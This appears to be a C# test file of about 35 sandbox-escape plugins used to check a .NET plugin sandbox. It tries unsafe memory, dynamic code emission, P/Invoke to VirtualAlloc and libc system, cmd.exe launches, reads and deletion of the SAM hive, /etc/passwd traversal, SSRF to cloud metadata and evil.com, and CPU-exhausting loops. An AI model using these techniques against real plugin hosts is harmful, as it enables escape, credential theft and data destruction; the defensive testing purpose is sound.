using System.Diagnostics;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.InteropServices;
using System.Runtime.CompilerServices;
using Lead;

public class UnsafeCodeBypass : ISandboxedPlugin
{
    private IPluginContext _ctx = null!;
    public string Id => "bypass-unsafe";
    public string Name => "Unsafe Code Bypass";
    public string Version => "1.0.0";
    public void Initialize(IPluginContext ctx) => _ctx = ctx;

    private static unsafe void DoUnsafe()
    {
        int x = 42;
        int* p = &x;
        *p = 0xDEAD;
    }

    public async Task ExecuteAsync(CancellationToken ct)
    {
        DoUnsafe();
        await Task.CompletedTask;
    }
    public void Shutdown() { }
}

public class PointerArithmeticBypass : ISandboxedPlugin
{
    private IPluginContext _ctx = null!;
    public string Id => "bypass-pointer-arith";
    public string Name => "Pointer Arithmetic Bypass";
    public string Version => "1.0.0";
    public void Initialize(IPluginContext ctx) => _ctx = ctx;

    private static unsafe void DoPointer()
    {
        byte* buf = (byte*)NativeMemory.Alloc(256);
        buf[0] = 0x90;
        NativeMemory.Free(buf);
    }

    public async Task ExecuteAsync(CancellationToken ct)
    {
        DoPointer();
        await Task.CompletedTask;
    }
    public void Shutdown() { }
}

public class IntPtrBypass : ISandboxedPlugin
{
    private IPluginContext _ctx = null!;
    public string Id => "bypass-intptr";
    public string Name => "IntPtr Bypass";
    public string Version => "1.0.0";
    public void Initialize(IPluginContext ctx) => _ctx = ctx;

    public async Task ExecuteAsync(CancellationToken ct)
    {
        IntPtr ptr = Marshal.AllocHGlobal(4096);
        Marshal.Copy(new byte[] { 0xCC }, 0, ptr, 1);
        Marshal.FreeHGlobal(ptr);
        await Task.CompletedTask;
    }
    public void Shutdown() { }
}

public class SpanBypass : ISandboxedPlugin
{
    private IPluginContext _ctx = null!;
    public string Id => "bypass-span";
    public string Name => "Span Bypass";
    public string Version => "1.0.0";
    public void Initialize(IPluginContext ctx) => _ctx = ctx;

    private static void DoSpan()
    {
        int[] arr = new int[10];
        Span<int> span = arr.AsSpan();
        span[0] = 42;
    }

    public async Task ExecuteAsync(CancellationToken ct)
    {
        DoSpan();
        await Task.CompletedTask;
    }
    public void Shutdown() { }
}

public class DynamicMethodBypass : ISandboxedPlugin
{
    private IPluginContext _ctx = null!;
    public string Id => "bypass-dynamicmethod";
    public string Name => "DynamicMethod Bypass";
    public string Version => "1.0.0";
    public void Initialize(IPluginContext ctx) => _ctx = ctx;

    public async Task ExecuteAsync(CancellationToken ct)
    {
        var dm = new DynamicMethod("Evil", typeof(void), null);
        ILGenerator il = dm.GetILGenerator();
        il.EmitWriteLine("executed via DynamicMethod");
        il.Emit(OpCodes.Ret);
        dm.Invoke(null, null);
        await Task.CompletedTask;
    }
    public void Shutdown() { }
}

public class AssemblyBuilderBypass : ISandboxedPlugin
{
    private IPluginContext _ctx = null!;
    public string Id => "bypass-assemblybuilder";
    public string Name => "AssemblyBuilder Bypass";
    public string Version => "1.0.0";
    public void Initialize(IPluginContext ctx) => _ctx = ctx;

    public async Task ExecuteAsync(CancellationToken ct)
    {
        var ab = AssemblyBuilder.DefineDynamicAssembly(new AssemblyName("EvilAsm"), AssemblyBuilderAccess.Run);
        ModuleBuilder mb = ab.DefineDynamicModule("EvilMod");
        TypeBuilder tb = mb.DefineType("EvilType", TypeAttributes.Public);
        tb.CreateType();
        await Task.CompletedTask;
    }
    public void Shutdown() { }
}

public class GCHandleBypass : ISandboxedPlugin
{
    private IPluginContext _ctx = null!;
    public string Id => "bypass-gchandle";
    public string Name => "GCHandle Bypass";
    public string Version => "1.0.0";
    public void Initialize(IPluginContext ctx) => _ctx = ctx;

    public async Task ExecuteAsync(CancellationToken ct)
    {
        byte[] buf = new byte[100];
        GCHandle handle = GCHandle.Alloc(buf, GCHandleType.Pinned);
        IntPtr addr = handle.AddrOfPinnedObject();
        handle.Free();
        await Task.CompletedTask;
    }
    public void Shutdown() { }
}

public class UnsafeClassBypass : ISandboxedPlugin
{
    private IPluginContext _ctx = null!;
    public string Id => "bypass-unsafeclass";
    public string Name => "Unsafe Class Bypass";
    public string Version => "1.0.0";
    public void Initialize(IPluginContext ctx) => _ctx = ctx;

    private static void DoUnsafeRef()
    {
        int x = 10;
        ref int r = ref Unsafe.AsRef(in x);
        r = 99;
    }

    public async Task ExecuteAsync(CancellationToken ct)
    {
        DoUnsafeRef();
        await Task.CompletedTask;
    }
    public void Shutdown() { }
}

public class BufferBypass : ISandboxedPlugin
{
    private IPluginContext _ctx = null!;
    public string Id => "bypass-buffer";
    public string Name => "Buffer.MemoryCopy Bypass";
    public string Version => "1.0.0";
    public void Initialize(IPluginContext ctx) => _ctx = ctx;

    private static unsafe void DoBufferCopy()
    {
        byte* src = (byte*)NativeMemory.Alloc(64);
        byte* dst = (byte*)NativeMemory.Alloc(64);
        Buffer.MemoryCopy(src, dst, 64, 64);
        NativeMemory.Free(src);
        NativeMemory.Free(dst);
    }

    public async Task ExecuteAsync(CancellationToken ct)
    {
        DoBufferCopy();
        await Task.CompletedTask;
    }
    public void Shutdown() { }
}

public class NativeLibraryBypass : ISandboxedPlugin
{
    private IPluginContext _ctx = null!;
    public string Id => "bypass-nativelib";
    public string Name => "NativeLibrary Bypass";
    public string Version => "1.0.0";
    public void Initialize(IPluginContext ctx) => _ctx = ctx;

    public async Task ExecuteAsync(CancellationToken ct)
    {
        IntPtr handle = NativeLibrary.Load("kernel32.dll");
        IntPtr proc = NativeLibrary.GetExport(handle, "GetTickCount");
        NativeLibrary.Free(handle);
        await Task.CompletedTask;
    }
    public void Shutdown() { }
}

public class ReflectionInvokeBypass : ISandboxedPlugin
{
    private IPluginContext _ctx = null!;
    public string Id => "bypass-reflection-invoke";
    public string Name => "MethodInfo.Invoke Bypass";
    public string Version => "1.0.0";
    public void Initialize(IPluginContext ctx) => _ctx = ctx;

    public async Task ExecuteAsync(CancellationToken ct)
    {
        var mi = typeof(File).GetMethod("ReadAllText", new[] { typeof(string) });
        mi?.Invoke(null, new object[] { @"C:\Windows\win.ini" });
        await Task.CompletedTask;
    }
    public void Shutdown() { }
}

public class ActivatorBypass : ISandboxedPlugin
{
    private IPluginContext _ctx = null!;
    public string Id => "bypass-activator";
    public string Name => "Activator.CreateInstance Bypass";
    public string Version => "1.0.0";
    public void Initialize(IPluginContext ctx) => _ctx = ctx;

    public async Task ExecuteAsync(CancellationToken ct)
    {
        var obj = Activator.CreateInstance(typeof(ProcessStartInfo), "cmd.exe");
        await Task.CompletedTask;
    }
    public void Shutdown() { }
}

public class PInvokeKernel32Bypass : ISandboxedPlugin
{
    private IPluginContext _ctx = null!;
    public string Id => "bypass-pinvoke-kernel32";
    public string Name => "P/Invoke kernel32 Bypass";
    public string Version => "1.0.0";
    public void Initialize(IPluginContext ctx) => _ctx = ctx;

    public async Task ExecuteAsync(CancellationToken ct)
    {
        Win32.VirtualAlloc(IntPtr.Zero, 4096, 0x1000, 0x40);
        await Task.CompletedTask;
    }
    public void Shutdown() { }
}

internal static class Win32
{
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
}

public class PInvokeLibcBypass : ISandboxedPlugin
{
    private IPluginContext _ctx = null!;
    public string Id => "bypass-pinvoke-libc";
    public string Name => "P/Invoke libc Bypass";
    public string Version => "1.0.0";
    public void Initialize(IPluginContext ctx) => _ctx = ctx;

    public async Task ExecuteAsync(CancellationToken ct)
    {
        LibC.system("echo hacked");
        await Task.CompletedTask;
    }
    public void Shutdown() { }
}

internal static class LibC
{
    [DllImport("libc.so.6")]
    public static extern int system(string command);
}

public class DelegateReflectionBypass : ISandboxedPlugin
{
    private IPluginContext _ctx = null!;
    public string Id => "bypass-delegate-reflection";
    public string Name => "Delegate.CreateDelegate Bypass";
    public string Version => "1.0.0";
    public void Initialize(IPluginContext ctx) => _ctx = ctx;

    public async Task ExecuteAsync(CancellationToken ct)
    {
        var mi = typeof(File).GetMethod("Delete");
        if (mi != null)
        {
            var del = Delegate.CreateDelegate(typeof(Action<string>), mi);
            del.DynamicInvoke("important_file.txt");
        }
        await Task.CompletedTask;
    }
    public void Shutdown() { }
}

public class ProcessBypass : ISandboxedPlugin
{
    private IPluginContext _ctx = null!;
    public string Id => "bypass-process";
    public string Name => "Process.Start Bypass";
    public string Version => "1.0.0";
    public void Initialize(IPluginContext ctx) => _ctx = ctx;

    public async Task ExecuteAsync(CancellationToken ct)
    {
        Process.Start("cmd.exe", "/c echo hacked");
        await Task.CompletedTask;
    }
    public void Shutdown() { }
}

public class EnvironmentBypass : ISandboxedPlugin
{
    private IPluginContext _ctx = null!;
    public string Id => "bypass-environment";
    public string Name => "Environment Bypass";
    public string Version => "1.0.0";
    public void Initialize(IPluginContext ctx) => _ctx = ctx;

    public async Task ExecuteAsync(CancellationToken ct)
    {
        string user = Environment.UserName;
        string os = Environment.OSVersion.ToString();
        string[] args = Environment.GetCommandLineArgs();
        await Task.CompletedTask;
    }
    public void Shutdown() { }
}

public class ThreadPoolBypass : ISandboxedPlugin
{
    private IPluginContext _ctx = null!;
    public string Id => "bypass-threadpool";
    public string Name => "ThreadPool Bypass";
    public string Version => "1.0.0";
    public void Initialize(IPluginContext ctx) => _ctx = ctx;

    public async Task ExecuteAsync(CancellationToken ct)
    {
        ThreadPool.QueueUserWorkItem(_ => { while (true) { } });
        await Task.CompletedTask;
    }
    public void Shutdown() { }
}

public class TaskRunBypass : ISandboxedPlugin
{
    private IPluginContext _ctx = null!;
    public string Id => "bypass-taskrun";
    public string Name => "Task.Run Bypass";
    public string Version => "1.0.0";
    public void Initialize(IPluginContext ctx) => _ctx = ctx;

    public async Task ExecuteAsync(CancellationToken ct)
    {
        await Task.Run(() => { while (true) { } });
    }
    public void Shutdown() { }
}

public class FieldInfoBypass : ISandboxedPlugin
{
    private IPluginContext _ctx = null!;
    public string Id => "bypass-fieldinfo";
    public string Name => "FieldInfo.SetValue Bypass";
    public string Version => "1.0.0";
    public void Initialize(IPluginContext ctx) => _ctx = ctx;

    public async Task ExecuteAsync(CancellationToken ct)
    {
        var fi = typeof(string).GetField("_stringLength", BindingFlags.NonPublic | BindingFlags.Instance);
        fi?.SetValue("test", 999);
        await Task.CompletedTask;
    }
    public void Shutdown() { }
}

public class LdtokenReflectionBypass : ISandboxedPlugin
{
    private IPluginContext _ctx = null!;
    public string Id => "bypass-ldtoken";
    public string Name => "ldtoken + typeof Reflection Bypass";
    public string Version => "1.0.0";
    public void Initialize(IPluginContext ctx) => _ctx = ctx;

    public async Task ExecuteAsync(CancellationToken ct)
    {
        Type t = typeof(Process);
        var methods = t.GetMethods(BindingFlags.Public | BindingFlags.Static);
        foreach (var m in methods)
        {
            if (m.Name == "Start") m.Invoke(null, new object[] { "cmd.exe" });
        }
        await Task.CompletedTask;
    }
    public void Shutdown() { }
}

[StructLayout(LayoutKind.Explicit)]
public struct OverlapStruct
{
    [FieldOffset(0)] public int Value;
    [FieldOffset(0)] public float AsFloat;
}

public class StructLayoutBypass : ISandboxedPlugin
{
    private IPluginContext _ctx = null!;
    public string Id => "bypass-structlayout";
    public string Name => "StructLayout Explicit Overlap Bypass";
    public string Version => "1.0.0";
    public void Initialize(IPluginContext ctx) => _ctx = ctx;

    public async Task ExecuteAsync(CancellationToken ct)
    {
        var s = new OverlapStruct();
        s.Value = 0x41414141;
        float f = s.AsFloat;
        await Task.CompletedTask;
    }
    public void Shutdown() { }
}

public class MemoryMarshalBypass : ISandboxedPlugin
{
    private IPluginContext _ctx = null!;
    public string Id => "bypass-memorymarshal";
    public string Name => "MemoryMarshal Cast Bypass";
    public string Version => "1.0.0";
    public void Initialize(IPluginContext ctx) => _ctx = ctx;

    private static void DoMarshal()
    {
        int[] arr = new int[4] { 1, 2, 3, 4 };
        Span<byte> bytes = MemoryMarshal.AsBytes<int>(arr.AsSpan());
        bytes[0] = 0xFF;
    }

    public async Task ExecuteAsync(CancellationToken ct)
    {
        DoMarshal();
        await Task.CompletedTask;
    }
    public void Shutdown() { }
}

public class MemoryMarshalReadBypass : ISandboxedPlugin
{
    private IPluginContext _ctx = null!;
    public string Id => "bypass-memorymarshal-read";
    public string Name => "MemoryMarshal.Read Bypass";
    public string Version => "1.0.0";
    public void Initialize(IPluginContext ctx) => _ctx = ctx;

    private static void DoMarshalRead()
    {
        byte[] data = BitConverter.GetBytes(0xDEADBEEF);
        int value = MemoryMarshal.Read<int>(data);
    }

    public async Task ExecuteAsync(CancellationToken ct)
    {
        DoMarshalRead();
        await Task.CompletedTask;
    }
    public void Shutdown() { }
}

public class ExceptionFilterBypass : ISandboxedPlugin
{
    private IPluginContext _ctx = null!;
    public string Id => "bypass-exception-filter";
    public string Name => "Exception Filter Side-Effect Bypass";
    public string Version => "1.0.0";
    public void Initialize(IPluginContext ctx) => _ctx = ctx;

    private static int _sideEffect;

    private static bool FilterSideEffect(Exception ex)
    {
        _sideEffect = 42;
        return false;
    }

    public async Task ExecuteAsync(CancellationToken ct)
    {
        try
        {
            throw new InvalidOperationException("trigger");
        }
        catch (Exception ex) when (FilterSideEffect(ex))
        {
        }
        finally
        {
            _sideEffect = 99;
        }
        await Task.CompletedTask;
    }
    public void Shutdown() { }
}

public class FinallyBlockBypass : ISandboxedPlugin
{
    private IPluginContext _ctx = null!;
    public string Id => "bypass-finally-block";
    public string Name => "Finally Block Side-Effect Bypass";
    public string Version => "1.0.0";
    public void Initialize(IPluginContext ctx) => _ctx = ctx;

    private static string _exfilData = "";

    public async Task ExecuteAsync(CancellationToken ct)
    {
        try
        {
            await Task.Delay(1, ct);
        }
        finally
        {
            _exfilData = "data exfiltrated via finally";
        }
        await Task.CompletedTask;
    }
    public void Shutdown() { }
}

public class TaskFloodBypass : ISandboxedPlugin
{
    private IPluginContext _ctx = null!;
    public string Id => "bypass-task-flood";
    public string Name => "Task.Delay Flood Bypass";
    public string Version => "1.0.0";
    public void Initialize(IPluginContext ctx) => _ctx = ctx;

    public async Task ExecuteAsync(CancellationToken ct)
    {
        var tasks = new List<Task>();
        for (int i = 0; i < 10000; i++)
        {
            tasks.Add(Task.Delay(TimeSpan.FromHours(1), ct));
        }
        await Task.WhenAll(tasks);
    }
    public void Shutdown() { }
}

public class UnmanagedCallersOnlyBypass : ISandboxedPlugin
{
    private IPluginContext _ctx = null!;
    public string Id => "bypass-unmanagedcallersonly";
    public string Name => "UnmanagedCallersOnly Bypass";
    public string Version => "1.0.0";
    public void Initialize(IPluginContext ctx) => _ctx = ctx;

    [UnmanagedCallersOnly(EntryPoint = "ExportedFunction")]
    public static int ExportedFunction(IntPtr arg, int arg2)
    {
        return 0;
    }

    public async Task ExecuteAsync(CancellationToken ct)
    {
        await Task.CompletedTask;
    }
    public void Shutdown() { }
}

public class ApiAbusePathTraversalBypass : ISandboxedPlugin
{
    private IPluginContext _ctx = null!;
    public string Id => "bypass-api-abuse-path";
    public string Name => "API Abuse: Path Traversal via FileService";
    public string Version => "1.0.0";
    public void Initialize(IPluginContext ctx) => _ctx = ctx;

    public async Task ExecuteAsync(CancellationToken ct)
    {
        var fs = _ctx.GetService<IFileService>();
        if (fs != null)
        {
            try { await fs.ReadTextFileAsync("../../../etc/passwd", ct); }
            catch (SandboxException ex) { Console.WriteLine($"    [Abuse] Path traversal blocked: {ex.Code}"); }

            try { await fs.ReadTextFileAsync(@"C:\Windows\System32\config\SAM", ct); }
            catch (SandboxException ex) { Console.WriteLine($"    [Abuse] Absolute path blocked: {ex.Code}"); }

            try { await fs.WriteTextFileAsync("evil.exe", "MZ...", ct); }
            catch (SandboxException ex) { Console.WriteLine($"    [Abuse] Forbidden ext blocked: {ex.Code}"); }
        }
        await Task.CompletedTask;
    }
    public void Shutdown() { }
}

public class ApiAbuseHttpBypass : ISandboxedPlugin
{
    private IPluginContext _ctx = null!;
    public string Id => "bypass-api-abuse-http";
    public string Name => "API Abuse: SSRF via HttpService";
    public string Version => "1.0.0";
    public void Initialize(IPluginContext ctx) => _ctx = ctx;

    public async Task ExecuteAsync(CancellationToken ct)
    {
        var http = _ctx.GetService<IHttpService>();
        if (http != null)
        {
            try { await http.HttpGetAsync("http://169.254.169.254/latest/meta-data/", ct: ct); }
            catch (SandboxException ex) { Console.WriteLine($"    [Abuse] SSRF private IP blocked: {ex.Code}"); }

            try { await http.HttpGetAsync("http://localhost:6379/", ct: ct); }
            catch (SandboxException ex) { Console.WriteLine($"    [Abuse] SSRF localhost blocked: {ex.Code}"); }

            try { await http.HttpGetAsync("http://10.0.0.1/admin", ct: ct); }
            catch (SandboxException ex) { Console.WriteLine($"    [Abuse] SSRF internal network blocked: {ex.Code}"); }

            try { await http.HttpGetAsync("ftp://evil.com/payload", ct: ct); }
            catch (SandboxException ex) { Console.WriteLine($"    [Abuse] Forbidden protocol blocked: {ex.Code}"); }

            try { await http.HttpGetAsync("https://evil.com/api/steal", ct: ct); }
            catch (SandboxException ex) { Console.WriteLine($"    [Abuse] Non-whitelisted URL blocked: {ex.Code}"); }
        }
        await Task.CompletedTask;
    }
    public void Shutdown() { }
}

public class ApiAbuseResourceExhaustionBypass : ISandboxedPlugin
{
    private IPluginContext _ctx = null!;
    public string Id => "bypass-api-abuse-resource";
    public string Name => "API Abuse: Resource Exhaustion via FileService";
    public string Version => "1.0.0";
    public void Initialize(IPluginContext ctx) => _ctx = ctx;

    public async Task ExecuteAsync(CancellationToken ct)
    {
        var fs = _ctx.GetService<IFileService>();
        if (fs != null)
        {
            try
            {
                var bigContent = new string('A', 100_000_000);
                await fs.WriteTextFileAsync("huge.txt", bigContent, ct);
            }
            catch (SandboxException ex)
            {
                Console.WriteLine($"    [Abuse] File size limit blocked: {ex.Code}");
            }
        }
        await Task.CompletedTask;
    }
    public void Shutdown() { }
}

public class DirectFileDeleteBypass : ISandboxedPlugin
{
    private IPluginContext _ctx = null!;
    public string Id => "bypass-direct-file-delete";
    public string Name => "Direct File.Delete Bypass";
    public string Version => "1.0.0";
    public void Initialize(IPluginContext ctx) => _ctx = ctx;

    public async Task ExecuteAsync(CancellationToken ct)
    {
        try
        {
            System.IO.File.Delete(@"C:\Windows\system32\config\SAM");
        }
        catch { }
        await Task.CompletedTask;
    }
    public void Shutdown() { }
}

public class DirectFileReadBypass : ISandboxedPlugin
{
    private IPluginContext _ctx = null!;
    public string Id => "bypass-direct-file-read";
    public string Name => "Direct File.ReadAllText Bypass";
    public string Version => "1.0.0";
    public void Initialize(IPluginContext ctx) => _ctx = ctx;

    public async Task ExecuteAsync(CancellationToken ct)
    {
        try
        {
            var content = System.IO.File.ReadAllText(@"C:\Windows\win.ini");
            Console.WriteLine($"    [DirectRead] Got content: {content.Substring(0, Math.Min(50, content.Length))}");
        }
        catch { }
        await Task.CompletedTask;
    }
    public void Shutdown() { }
}

public class DirectHttpClientBypass : ISandboxedPlugin
{
    private IPluginContext _ctx = null!;
    public string Id => "bypass-direct-httpclient";
    public string Name => "Direct HttpClient Bypass";
    public string Version => "1.0.0";
    public void Initialize(IPluginContext ctx) => _ctx = ctx;

    public async Task ExecuteAsync(CancellationToken ct)
    {
        try
        {
            using var client = new System.Net.Http.HttpClient();
            var resp = await client.GetStringAsync("http://169.254.169.254/latest/meta-data/");
            Console.WriteLine($"    [DirectHTTP] Got metadata: {resp}");
        }
        catch { }
        await Task.CompletedTask;
    }
    public void Shutdown() { }
}
